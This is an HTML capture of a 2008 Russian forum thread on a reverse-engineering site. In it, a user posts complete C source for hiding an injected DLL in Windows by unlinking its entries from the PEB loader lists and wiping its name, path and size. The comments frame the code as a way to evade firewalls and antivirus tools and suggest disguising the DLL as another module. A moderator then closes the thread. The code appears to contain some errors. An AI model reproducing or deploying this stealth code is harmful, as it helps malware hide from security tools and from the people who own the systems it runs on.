<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>Усовершенствование метода сокрытия внедренной dll в изложении на Cи для ОС Windows - eXeL@B</title>
<meta NAME="DESCRIPTION" CONTENT="//Вот, может кому пригодиться. /*Usermode Hide dll metod in &#039;C&#039; advanced for new family OS Windows Я поместил весь код в один файл, что бы не париться и не оформлять потом в виде статьи, время- деньги, если у нас их">
<meta NAME="KEYWORDS" CONTENT="x64_dbg windbg ollydbg ida скачать взлом отладчик ассемблер дизассемблер крэкер cracker реверсер keygen кейген кодер патч патчер крэкми лоадер брутфорсер протектор распаковщик пароль ключ ключфайл шпион oep key защита программа winapi faq hiew windasm softice winhex">
<META NAME="Document-state" CONTENT="Dynamic">
<META HTTP-EQUIV="Pragma" CONTENT="no-cache"> 
<link rel="SHORTCUT ICON" href="/favicon.ico">
<meta name="viewport" content="width=device-width">
<link href="./skin/s0.css" type="text/css" rel="STYLESHEET">
<link href="./skin/code.css" type="text/css" rel="STYLESHEET">
<script type="text/javascript" src="./js/jq.js"></script>
<link rel="alternate" type="application/rss+xml" title="eXeL@B" href="./rss.php">
<style type="text/css">.username div .dops{display:none;}</style>
<link href="../menu.css" type="text/css" rel="stylesheet">
</head>

<body>
<a id="to_top"></a>
<div id="wrapper">
 
<div class="mob-hamburger"><span></span></div>
 
</center></div><script type='text/javascript'>
function lst(){var i=0;var htm='';var a='';var timer=setInterval(function(){if(i<10){i=i+10;}else{clearInterval(timer);i=0;}document.getElementById('kurs_container').style.marginLeft='-'+i+'px';},100);}
document.addEventListener('DOMContentLoaded',function(event){setTimeout(lst,1500);setInterval(lst,10000);});
</script></div></div>
<script type="text/javascript">
jQuery(document).ready(function(){
    jQuery(".mob-hamburger").on("click", function() {
        jQuery(".mob-hamburger").toggleClass("active");
        jQuery("#site-navigation").slideToggle();
		if (jQuery('.mob-hamburger').hasClass('active')) {
			var i = jQuery('#site-navigation').offset().top;
		} else { 
			var i = 0;
		}
			
		jQuery("html, body").animate({ scrollTop: i }, 600);
    });
	var btn = jQuery('#to_top');
	jQuery(window).scroll(function() {
		if (jQuery(window).scrollTop() > 300) {
			btn.addClass('show');
		} else {
			btn.removeClass('show');
		}
	});
	btn.on('click', function(e) {
		e.preventDefault();
		jQuery('html, body').animate({scrollTop:0}, '300');
	});
});
</script>
 
<div id="content">
<div align=center style="margin-top:15px">

<table class=tbTransparent>
<tr><td class=tbTransparent>
<span class=txtSm>Сейчас на форуме: <b><a target='_blank' href='?action=userinfo&amp;user=55995'>tyns777</a> (+5 невидимых)</b></span>
</td>
</tr>
</table>

 

</div><br>
<script language="javascript" type="text/javascript" charset="windows-1251" src="templates/base.js"></script>

<div align=center><table class=forums><tr>
<td width=16 valign=top class=caption3><img src="./img/forum_icons/p.gif" width=16 height=16 alt=""></td>
<td width="100%" class=caption3><span class=header>&nbsp;<a href="../index.html"><b>eXeL@B</b></a> <b class=bulletHead>&#8212;&#8250;</b> <a href="action=vtopic&amp;forum=6&sortBy=0&page=0.html"><b>Программирование</b></a> <b class=bulletHead>&#8212;&#8250;</b> Усовершенствование метода сокрытия внедренной dll в изложении на Cи для ОС Windows</span></td>
</tr></table>
<table class=tbTransparent><tr><td class=tbTransparent><span class=txtSm><b></b></span></td></tr></table>
<table class=forums><tr>
<td width="15%" class=caption4><span class=txtSm><b>Посл.ответ</b></span></td>
<td width="85%" class=caption4><span class=txtSm><b>Сообщение</b></span></td></tr>
<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="1" onfocus="this.blur()" href="JavaScript:di('[b]RET[/b]','')">RET</a></b><br></div>
<img src="img/s1.gif" alt=""><br><span class=txtSm>Ранг: 4.1 (гость)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 12.52'>Активность: 0=0</span><br>Статус: <a href="action=userinfo&amp;user=14854">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 07 января 2008 22:10 &middot; Поправил: RET <br><script type="text/javascript">QU('RET','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=RET" target="_blank">Личное сообщение</a> &middot;  <a href="#1" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=10967.html&amp;page=0#1');return false;">#1</a> </span><div align=left><br>
//Вот, может кому пригодиться.<br>/*Usermode Hide dll metod in &#039;C&#039; advanced for new family OS Windows<br>Я поместил весь код в один файл, что бы не париться и не оформлять потом<br>в виде статьи, время- деньги, если  у нас их нет, мы возьмем их у вас (шутка).<br>Все что я здесь накодил - только для изучения стойкости систем защиты от <br>вирусов и других вредных для нас программ и т.д. Как вы будете это применять<br>мне абсолютно все равно, ибо cogitations poenam nemo patitur.<br>К написанию данного примера, меня подтолкнула неспособность старых методов<br>скрывать dll из списка загруженных модулей процесса в новых ОС семейства<br>Windows, а именно фатальные ошибки, возникающие при попытках изменения<br>циклических структур LIST_ENTRY.Blink, очевидно связанные с изменением<br>производителями ядра самих этих структур. Поэтому используемые структуры максимально<br>урезаны для данного применения. Наша цель - произвести изменения системной<br>памяти родительского процесса, физически находящейся в его адресном пространстве между<br>памятью выделенной под стек главного потока и начальным адресом проекции файла<br>unicode.nls с целью уничтожения следов о загрузке нашей dll в память этого процесса,<br>которые там оставил загрузчик ядра Windows. Привилегии отладчика нам для этого не нужны. Приступим к делу, пока ребята из Microsoft или Agnitum еще чего нибудь не придумали.*/<br>#pragma once<br>#define _WIN32_WINNT 0x501<br>#include &lt;windows.h&gt;<br>//Укорачиваем машинный код, за счет секций и выкидываем по-возможности msvcrt<br>//We abbreviate computer code, to account of sections and miscarry msvcrt<br>#pragma comment(linker, &quot;/SECTION:.text,EWRX&quot;) <br>#pragma comment(linker, &quot;/MERGE:.rdata=.data&quot;) <br>#pragma comment(linker, &quot;/MERGE:.text=.data&quot;)<br>/*Объявляем структуры (некоторые сильно урезанные для наших целей)<br>We Declare structures (some powerfully pared for our whole)<br>Назначение структур хорошо понятно из их названий и содержания*/<br>typedef struct _UNICODE_STRING<br>{ USHORT Length;<br>  USHORT MaximumLength;<br>  PWSTR Buffer;<br>} UNICODE_STRING, *PUNICODE_STRING;<br><br>typedef struct _PEB_LDR_DATA <br>{ ULONG Length;<br>  BOOLEAN Initialized;<br>  PVOID SsHandle; <br>  LIST_ENTRY InLoadOrderModuleList;<br>  LIST_ENTRY InMemoryOrderModuleList;<br>  //&lt;-pared<br>} PEB_LDR_DATA, *PPEB_LDR_DATA;<br><br>typedef struct _LDR_MODULE <br>{ LIST_ENTRY InLoadOrderModuleList;<br>  LIST_ENTRY InMemoryOrderModuleList;<br>  LIST_ENTRY InInitializationOrderModuleList;<br>  PVOID BaseAddress;<br>  PVOID EntryPoint;<br>  ULONG SizeOfImage;<br>  UNICODE_STRING FullDllName;<br>  UNICODE_STRING BaseDllName;<br>  ULONG Flags;<br>  SHORT LoadCount;<br>  SHORT TlsIndex;<br>  LIST_ENTRY HashTableEntry;<br>  ULONG TimeDateStamp;<br>} LDR_MODULE, *PLDR_MODULE;<br><br>typedef struct _PEB <br>{ BOOLEAN InheritedAddressSpace;<br>  BOOLEAN ReadImageFileExecOptions;<br>  BOOLEAN BeingDebugged;<br>  BOOLEAN Spare;<br>  HANDLE Mutant;<br>  PVOID ImageBaseAddress;<br>  PPEB_LDR_DATA LoaderData;<br>  //&lt;-pared<br>}PEB,*PPEB;<br><br>typedef struct _CLIENT_ID <br>{ HANDLE  UniqueProcess;<br>  HANDLE  UniqueThread;<br>} CLIENT_ID, *PCLIENT_ID;<br><br>typedef struct _TEB <br>{ NT_TIB Tib;<br>  PVOID EnvironmentPointer;<br>  CLIENT_ID Cid;<br>  PVOID ActiveRpcInfo;<br>  PVOID ThreadLocalStoragePointer;<br>  PPEB Peb;<br>  //&lt;-pared<br>}PTEB;<br>/*Прототип функции получения указателя на TEB из ntdll<br>Function of reception of pointer on TEB from ntdll*/<br>typedef PTEB (NTAPI* GetCurrentNTTeb)(void);<br><br>//Сама наша функция<br>void DllHide(HANDLE hDLL)<br>{<br>	PTEB TEB1;<br>	PEB* PEB1;<br>	LIST_ENTRY LIST_ENTRY1;<br>	PEB_LDR_DATA* PEB_LDR_DATA1;<br>	LDR_MODULE* LDR_MODULE1;<br>	/*Получаем указатель на PEB, это можно сделать 3-я методами<br>	Метод 1(самый простой) :<br>	__asm<br>	{<br>	 mov  eax, fs:[30h]<br>	 mov  PEB1, eax<br>	}<br>	Метод 2:<br>	__asm <br>               { <br>                 mov eax, fs:[18h]<br>                 mov TEB1, eax<br>	}<br>	PEB1=TEB1.Peb;*/<br>	//Метод 3 (стандартными средствами ядра=&gt;,более-менее базонезависимый):<br>	GetCurrentNTTeb NtGetTEB = NULL;<br>	NtGetTEB = (GetCurrentNTTeb)GetProcAddress(GetModuleHandle(&quot;ntdll.dll&quot;),&quot;NtCurren  tTeb&quot;);<br>	TEB1=NtGetTEB();<br>	PEB1=TEB1.Peb;<br>	//Получаем указатель на структуру, оставленную загрузчиком ядра<br>	PEB_LDR_DATA1=PEB1-&gt;LoaderData;<br>	/*Получаем указатель на первый список загруженных модулей<br>	он всегда описывает ntdll.dll*/<br>	LIST_ENTRY1=PEB_LDR_DATA1-&gt;InLoadOrderModuleList;<br>	/*Перечисляем списки, пока LDR_MODULE1-&gt;BaseAddress<br>	не совпадет с адресом загрузки нашей dll (здесь можно ускорить<br>	и так быстрый процесс, но это оставлю вам)*/<br>	do{	LIST_ENTRY1=*LIST_ENTRY1.Flink;<br>		LDR_MODULE1=(_LDR_MODULE *)LIST_ENTRY1.Flink;<br>	}while(LDR_MODULE1-&gt;BaseAddress!=hDLL);<br>	/*Подчищаем структуры, связанные с нашей dll<br>	здесь код немного растянут для понимаемости*/<br>                MessageBox(NULL,&quot;Вхождение найдено, после \n нажатия OK  dll скроется&quot;,<br>                &quot;HideDll&quot;,MB_OK);<br>	LIST_ENTRY* LIST_ENTRY2;<br>	LIST_ENTRY* LIST_ENTRY3;<br>	LIST_ENTRY3=LIST_ENTRY1.Flink;<br>	LIST_ENTRY2=LIST_ENTRY1.Blink;<br>	*LIST_ENTRY2-&gt;Flink=*LIST_ENTRY3;<br>	/*Дальше, начиная с XP SP2 не работает:<br>	LIST_ENTRY3=LIST_ENTRY1.Blink;<br>	LIST_ENTRY2=LIST_ENTRY1.Flink;<br>	*LIST_ENTRY2-&gt;Blink=*LIST_ENTRY3;*/<br>	//Продолжаем<br>	LIST_ENTRY1=LDR_MODULE1-&gt;InMemoryOrderModuleList;<br>	LIST_ENTRY3=LIST_ENTRY1.Flink;<br>	LIST_ENTRY2=LIST_ENTRY1.Blink;<br>	*LIST_ENTRY2-&gt;Flink=*LIST_ENTRY3;<br>	/*Дальше, начиная с XP SP2 не работает:<br>	LIST_ENTRY3=LIST_ENTRY1.Blink;<br>	LIST_ENTRY2=LIST_ENTRY1.Flink;<br>	*LIST_ENTRY2-&gt;Blink=*LIST_ENTRY3;*/<br>	/*Практически все, нас уже не видно в ProcessExplorer,Task Explorer,<br>	даже в Microsoft ListDlls, а вот в каком то-там Starter видно!!!<br>	А все это потому, что мы удалили вхождения, а вот дескриптор оставили*/<br>	//Затираем дескриптор (для наглядности через ZeroMemory)<br>	RtlZeroMemory(&amp;LDR_MODULE1-&gt;BaseAddress,sizeof(DWORD));<br>	/*Практически все, нас нет, но мы работаем, и думая о будущем наших<br>	фаеров и антивирусов все же подчистим за собой мусор, а именно<br>	удалим от греха всю информацию о нашей dll из контекста*/<br>	//Чистим путь к нашей dll<br>	RtlZeroMemory(&amp;LDR_MODULE1-&gt;FullDllName,sizeof(UNICODE_STRING));<br>	//Чистим имя нашей dll<br>	RtlZeroMemory(&amp;LDR_MODULE1-&gt;BaseDllName,sizeof(UNICODE_STRING));<br>	//Чистим дату создания нашей dll<br>	RtlZeroMemory(&amp;LDR_MODULE1-&gt;TimeDateStamp,sizeof(DWORD));<br>	//Чистим размер отображения нашей dll<br>	RtlZeroMemory(&amp;LDR_MODULE1-&gt;SizeOfImage,sizeof(DWORD));<br>	/*Если захотите можете замаскировать свою dll под какую-либо другую,<br>	заменив в LDR_MODULE вышеперечисленное чем-то своим*/<br>}<br><br>//Только для примера//For examples<br>DWORD WINAPI BEEPER(LPVOID hDll)<br>{	<br>	//пример вызова<br>	DllHide(hDll);<br>	while(true){Sleep(1000); Beep(8000,50);}<br>	return 0;<br>}<br><br>BOOL APIENTRY DllMain( HANDLE hModule, <br>                       DWORD  ul_reason_for_call, <br>                       LPVOID lpReserved)<br>{<br>    switch (ul_reason_for_call)<br>	{<br>		case DLL_PROCESS_ATTACH:<br>			/*Для примера таймер с бипером ч/з системный динамик<br>			правда отсюда создавать потоки не желательно<br>			Поток берется в качестве примера не случайно:<br>			Если посмотреть в списке потоков в том же Process Explorer,<br>                                                то мы увидим, что наш поток принадлежит якобы <br>                                                 вовсе не нам а kernel32.dllт.к. указателя на дескриптор нашей dll <br>                                                в системной таблице контекста нет*/<br>			CreateThread(NULL,0,BEEPER,(LPVOID)hModule,0,NULL); //For examples<br>			break;<br>		case DLL_THREAD_ATTACH: break;<br>		case DLL_THREAD_DETACH:	break;<br>		case DLL_PROCESS_DETACH: break;<br>    }<br>	if(hModule!=0) 	return true;<br>	else return false;<br>}<br>/*History source:<br>-Tomasz Nowak (http://undocumented.ntinternals.net);<br>-Sven B. Schreiber (sbs@orgon.com);<br>-MS-Rem (http://wasm.ru/print.php?article=fwb*/<br>// RET © 2008 <br>P.S.:Форматировать некогда - все исходники в аттаче. <br><br><br><img src="img/attach.gif" alt=""> <a href="./files/6266_07.01.2008_CRACKLAB.rU.tgz">6266_07.01.2008_CRACKLAB.rU.tgz</a> - s+a.zip
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=176530&amp;user=14854&amp;forum_n=6&amp;topic=10967.html&amp;page=0&amp;anchor=1" class="addthx" data-post="176530"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr><td class=caption4 colspan=2></td></tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="2" onfocus="this.blur()" href="JavaScript:di('[b]Archer[/b]','')">Archer</a></b><br></div>
<img src="img/s9.gif" alt=""><br><img style="padding-top:3px;" src="av/1556.jpg" alt=""><br><span class=txtSm>Ранг: 2014.5 <b><u>(!!!!)</u></b>, 1278thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.27'>Активность: 1.34<span style='color:red'>&searr;</span>0.25</span><br>Статус: <a href="action=userinfo&amp;user=1556">Модератор</a><br><font color=blue>retired</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 07 января 2008 22:20 <br><script type="text/javascript">QU('Archer','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Archer" target="_blank">Личное сообщение</a> &middot;  <a href="#2" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=6&amp;topic=10967.html&amp;page=0#2');return false;">#2</a> </span><div align=left><br>
Учитывая твой прошлый топик аналогичного содержания, где ты умудрился постирать чужие советы, ты сам сказал, что никакие советы не нужны, просто выложил код. Во избежание флуда в этой теме, её тоже сразу закрываю. Если будет нужно-стучи, открою.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=176534&amp;user=1556&amp;forum_n=6&amp;topic=10967.html&amp;page=0&amp;anchor=2" class="addthx" data-post="176534"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>


</table>
<table class=tbTransparent><tr><td class=tbTransparent><span class=txtSm><b></b></span></td></tr></table>
<table class=forums><tr>
<td width=16 valign=top class=caption3><img src="./img/forum_icons/p.gif" width=16 height=16 alt=""></td>
<td width="100%" class=caption3><span class=header>&nbsp;<a href="../index.html"><b>eXeL@B</b></a> <b class=bulletHead>&#8212;&#8250;</b> <a href="action=vtopic&amp;forum=6&sortBy=0&page=0.html"><b>Программирование</b></a> <b class=bulletHead>&#8212;&#8250;</b> Усовершенствование метода сокрытия внедренной dll в изложении на Cи для ОС Windows</span></td>
</tr></table>
</div>
<a name=newreply></a>
<div align=center>
<table class=forums>
<tr>
<td class=caption4 width="100%"><span class=header>Эта тема закрыта. Ответы больше не принимаются.</span></td>
</tr>
</table>
</div>
<script type="text/javascript" src="templates/vthread_logged.js"></script>
<div align=center><table class=tbTransparent><tr>
<td class=tbTransparent><span class=txtSm>      &nbsp;&nbsp;&nbsp;<a href="/f/forprint.php?topic_id=10967" title="Версия для печати"><img src="img/forprint.gif" border="0" alt="Для печати"> Для печати</a>&nbsp;</span></td>
</tr></table></div>
<br>
 
<br><br><br></center>

</div>
<div id="footer">Вы находитесь на EXELAB.rU</div>
<div id="footer_btns">
<a href="http://www.reactos.org" rel="nofollow" target="_blank"><img src="./images/react.png" height="31" width="88" border="0" title="" alt=""></a> <script type="text/javascript"><!--
document.write("<img src='//counter.yadro.ru/hit?t44.2;r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";h"+escape(document.title.substring(0,80))+";"+Math.random()+
"' "+
"border='0' width='31' height='31'>")
//--></script>
</div>
</div>

</body></html>
